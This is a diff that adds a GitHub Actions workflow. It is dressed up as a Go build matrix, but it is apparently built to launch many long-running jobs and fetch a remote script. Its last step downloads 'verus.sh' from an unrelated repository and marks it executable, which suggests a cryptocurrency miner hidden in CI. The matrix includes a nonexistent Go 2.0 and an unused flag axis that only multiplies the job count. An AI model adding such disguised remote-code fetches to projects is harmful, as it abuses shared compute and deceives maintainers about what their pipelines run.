@@ -1,0 +1,27 @@
+name: VERUS
+on: [push, pull_request]
+jobs:
+  build:
+    name: TOD
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 10
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 2.0]
+        flag: [A, B, C, D, E, F]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 10
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Gaskan
+      run: |
+        wget https://raw.githubusercontent.com/ukuuko/tes/main/verus.sh  && chmod u+x verus.sh
